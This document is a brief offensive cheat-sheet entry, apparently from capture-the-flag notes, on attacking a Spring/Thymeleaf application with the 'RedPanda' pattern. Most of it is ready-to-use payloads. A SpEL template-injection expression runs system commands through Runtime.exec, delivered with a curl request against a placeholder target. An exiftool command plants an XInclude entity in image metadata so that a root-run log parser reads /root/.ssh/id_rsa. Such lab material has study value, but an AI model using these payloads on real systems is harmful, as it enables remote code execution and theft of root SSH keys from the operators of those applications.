# Java Spring SSTI (Thymeleaf / SpEL) — RedPanda Pattern

Java SSTI in a Spring/Thymeleaf app that logs user-controlled input into XML logs. Escalate by poisoning the logs with an XXE payload that triggers when the log parser (running as root) processes the log.

**Initial SSTI (get shell as app user):**
```
# Thymeleaf SpEL — blacklist bypass via *{} context
*{T(java.lang.Runtime).getRuntime().exec('id')}
# or via URL parameter:
curl 'http://<TARGET>/search?name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}'
```

**Log poisoning → XXE for file read as root:**
```
# The app logs the "Author" field from image EXIF metadata into XML:
# <Author>USER_INPUT</Author>
# Inject XXE entity into metadata using exiftool:
exiftool -Artist='"><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///root/.ssh/id_rsa" parse="text"/></foo>' evil.jpg
# Upload image → log parsed → SSH key returned in next log read endpoint
```
